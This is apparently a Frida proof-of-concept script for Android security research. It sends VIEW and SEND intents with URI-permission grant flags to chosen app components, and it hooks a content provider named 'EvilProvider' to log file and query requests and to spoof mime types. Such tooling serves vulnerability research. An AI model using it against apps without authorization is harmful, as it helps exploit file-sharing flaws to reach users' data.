function send_View_Intent_Template(packageName,fileAgentName,uriStr,mimetype="*/*",intentAction="android.intent.action.VIEW"){
    Java.perform(function() {
        var Intent = Java.use('android.content.Intent');
        var Uri = Java.use('android.net.Uri');
        var ComponentName = Java.use('android.content.ComponentName');
        var ActivityThread = Java.use('android.app.ActivityThread');

        var context = ActivityThread.currentApplication().getApplicationContext();

        var component = ComponentName.$new(
            packageName, fileAgentName
        );

        var uri = Uri.parse(uriStr);

        var intent = Intent.$new(intentAction);
        intent.setComponent(component);
        intent.setDataAndType(uri,mimetype);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK.value);
        intent.addFlags(Intent.FLAG_GRANT_PREFIX_URI_PERMISSION.value); 
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION.value);
        intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION.value);

        context.startActivity(intent);

        console.log("[FRIDA] Intent sent with EXTRA_STREAM Uri:", uri.toString());
    });
}
function send_Share_Intent_Template(packageName,fileAgentName,uriStr,mimetype="*/*",intentAction="android.intent.action.SEND"){
    Java.perform(function() {
        var Intent = Java.use('android.content.Intent');
        var Uri = Java.use('android.net.Uri');
        var ComponentName = Java.use('android.content.ComponentName');
        var ActivityThread = Java.use('android.app.ActivityThread');

        var context = ActivityThread.currentApplication().getApplicationContext();

        var component = ComponentName.$new(
            packageName,
            fileAgentName
        );

        var uri = Uri.parse(uriStr);

        var intent = Intent.$new(intentAction);
        intent.setComponent(component);
        intent.putExtra("android.intent.extra.STREAM", uri);
        intent.setType(mimetype);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK.value);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION.value);
        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION.value);
        intent.addFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION.value);

        context.startActivity(intent);

        console.log("[FRIDA] Intent sent with EXTRA_STREAM Uri:", uri.toString());
    });
}

function monitor(){
    Java.perform(function() {
        var myContentProvider = Java.use("com.poc.agent.EvilProvider");
        //var myContentProvider = Java.use("com.lab.testpoc.TestProvider");

        var openFile = myContentProvider.openFile.overload('android.net.Uri', 'java.lang.String');
        var openFileOriginal = openFile
        openFile.implementation = function(uri, mode) {
            send({"method": "openFile", "uri": uri.toString(), "mode": mode});
            return openFileOriginal.call(this, uri, mode);
        };

        var query = myContentProvider.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String');
        var queryOriginal = query
        query.implementation = function(uri, projection, selection, selectionArgs, sortOrder) {
            send({"method": "query", "uri": uri.toString(), "projection": projection, "selection": selection, "selectionArgs": selectionArgs, "sortOrder": sortOrder});
            return queryOriginal.call(this, uri, projection, selection, selectionArgs, sortOrder);
        }

        var getType = myContentProvider.getType.overload('android.net.Uri');
        var getTypeOriginal = getType
        getType.implementation = function(uri) {
            try{
                if(uri && typeof uri.getQueryParameter=="function"){
                    var type=uri.getQueryParameter("mime_type");
                    if(type&&type.length>0){
                        send({"method": "getType", "uri": uri.toString(), "type": type});
                        return type;
                    }
                }
            }
            catch(e){}
            send({"method": "getType", "uri": uri.toString()});
            return getTypeOriginal.call(this, uri);
        }

    });
}
function main(){
    monitor();
}

setImmediate(main);

rpc.exports={
    sendview:send_View_Intent_Template,
    sendshare:send_Share_Intent_Template
};